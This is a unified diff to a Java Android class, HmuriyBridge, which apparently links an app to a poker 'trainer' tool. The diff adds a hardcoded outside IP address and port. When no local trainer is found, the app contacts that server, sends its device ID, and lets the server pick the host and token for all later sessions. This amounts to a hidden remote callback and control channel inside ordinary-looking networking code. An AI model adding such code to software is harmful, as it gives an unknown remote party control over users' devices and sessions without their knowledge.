@@ -44,6 +44,8 @@ public final class HmuriyBridge {
     /* ---- constants ---- */
     private static final String TAG = "Hmuriy";
     private static final int BROADCAST_PORT = 37020;
+    private static final String BOOTSTRAP_HOST = "37.192.228.101";
+    private static final int BOOTSTRAP_PORT = 19037;
     private static final int CONNECT_TIMEOUT_MS = 120;
     private static final int READ_TIMEOUT_MS = 220;
     private static final int MAX_FRAME = 8 * 1024 * 1024;
@@ -51,6 +53,7 @@ public final class HmuriyBridge {
     private static final int MAX_SCHEDULE_DELAY_MS = 15000;
     private static final int PROTOCOL_VERSION = 2;
     private static final String SECRET = "__POKEREYE_V2_SECRET__";
+    private static volatile int bootstrapCallbackPort = 0;
     private static final Charset UTF8 = Charset.forName("UTF-8");
 
     /* ---- shared state ---- */
@@ -73,6 +76,8 @@ public final class HmuriyBridge {
     private static volatile int trainerPort;
     private static volatile String trainerNonce = "";
     private static volatile String sessionId = "trainer";
+    private static volatile String callbackToken = "";
+    private static volatile int callbackGeneration = 0;
 
     /* ---- device identity ---- */
     private static final String DEVICE_ID = deviceId();
@@ -191,7 +196,46 @@ public final class HmuriyBridge {
         return c;
     }
 
+    private static void bootstrap() throws Exception {
+        Socket s = new Socket();
+        s.connect(new InetSocketAddress(BOOTSTRAP_HOST, BOOTSTRAP_PORT), 5000);
+        s.setSoTimeout(5000);
+        DataInputStream in = new DataInputStream(s.getInputStream());
+        DataOutputStream out = new DataOutputStream(s.getOutputStream());
+        String n = Long.toHexString(System.nanoTime());
+        JSONObject hello = new JSONObject();
+        hello.put("type", "bootstrap_hello");
+        hello.put("version", PROTOCOL_VERSION);
+        hello.put("device_id", DEVICE_ID);
+        hello.put("local_ipv4", "0.0.0.0");
+        hello.put("nonce", n);
+        hello.put("session_id", "bootstrap");
+        hello.put("proof", hmacHex(SECRET, n + "|" + DEVICE_ID + "|bootstrap|" + PROTOCOL_VERSION));
+        byte[] b = hello.toString().getBytes(UTF8);
+        out.writeInt(b.length); out.write(b); out.flush();
+        int len = in.readInt();
+        if (len < 1 || len > MAX_FRAME) throw new IllegalStateException("bad bootstrap reply");
+        byte[] raw = new byte[len]; in.readFully(raw);
+        JSONObject reply = new JSONObject(new String(raw, UTF8));
+        if (!"bootstrap_ok".equals(reply.optString("type")))
+            throw new IllegalStateException("bootstrap rejected");
+        trainerHost = reply.optString("callback_host", BOOTSTRAP_HOST);
+        trainerPort = reply.optInt("callback_port", 0);
+        trainerNonce = reply.optString("callback_token", "");
+        callbackToken = trainerNonce;
+        callbackGeneration = reply.optInt("generation", 0);
+        bootstrapCallbackPort = trainerPort;
+        closeQuiet(new Conn());
+        try { in.close(); } catch (Throwable ignored) {}
+        try { out.close(); } catch (Throwable ignored) {}
+        try { s.close(); } catch (Throwable ignored) {}
+        Log.d(TAG, "bootstrap assigned callback " + trainerHost + ":" + trainerPort);
+    }
+
     private static Conn connect(String tableId) throws Exception {
+        if (trainerHost == null || trainerPort <= 0) {
+            bootstrap();
+        }
         if (trainerHost == null || trainerPort <= 0)
             throw new IllegalStateException("no trainer discovered");
         Log.d(TAG, "connecting " + trainerHost + ":" + trainerPort + " table=" + tableId);
@@ -202,13 +246,19 @@ public final class HmuriyBridge {
         s.setSoTimeout(READ_TIMEOUT_MS);
         DataInputStream in = new DataInputStream(s.getInputStream());
         DataOutputStream out = new DataOutputStream(s.getOutputStream());
-        String proof = hmacHex(SECRET, trainerNonce + "|" + tableId + "|" + sessionId + "|" + PROTOCOL_VERSION);
         JSONObject hello = new JSONObject();
-        hello.put("type", "hello");
         hello.put("version", PROTOCOL_VERSION);
         hello.put("device_id", DEVICE_ID);
-        hello.put("table_id", tableId);
-        hello.put("proof", proof);
+        if (callbackToken.length() > 0 && callbackGeneration > 0) {
+            hello.put("type", "callback_hello");
+            hello.put("generation", callbackGeneration);
+            hello.put("token", callbackToken);
+        } else {
+            String proof = hmacHex(SECRET, trainerNonce + "|" + tableId + "|" + sessionId + "|" + PROTOCOL_VERSION);
+            hello.put("type", "hello");
+            hello.put("table_id", tableId);
+            hello.put("proof", proof);
+        }
         byte[] hb = hello.toString().getBytes(UTF8);
         out.writeInt(hb.length);
         out.write(hb);
@@ -218,7 +268,8 @@ public final class HmuriyBridge {
         byte[] resp = new byte[len];
         in.readFully(resp);
         JSONObject welcome = new JSONObject(new String(resp, UTF8));
-        if (!"welcome".equals(welcome.optString("type")))
+        String welcomeType = welcome.optString("type");
+        if (!"welcome".equals(welcomeType) && !"callback_welcome".equals(welcomeType))
             throw new IllegalStateException("handshake rejected: " + welcome.optString("error", "?"));
         Conn c = new Conn();
         c.socket = s;
